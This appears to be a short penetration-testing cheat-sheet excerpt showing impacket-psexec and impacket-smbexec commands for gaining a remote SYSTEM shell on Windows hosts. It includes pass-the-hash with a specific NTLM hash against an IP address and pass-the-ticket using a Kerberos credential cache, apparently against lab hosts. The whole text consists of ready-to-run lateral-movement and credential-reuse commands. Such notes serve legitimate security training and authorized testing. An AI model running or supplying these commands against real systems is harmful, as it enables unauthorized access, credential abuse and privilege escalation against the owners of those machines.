```bash
$ impacket-psexec [<domain>/]<username>:<password>@<IP>
$ impacket-smbexec [<domain>/]<username>:<password>@<IP>


# pass-the-hash
$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

# pass-the-ticket
export KRB5CCNAME=/tmp/krb5cc_1120601113_ZFxZpK.ccache 
$ impacket-psexec jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Due to the nature of _psexec.py_, we'll always receive a shell as SYSTEM instead of the user we used to authenticate.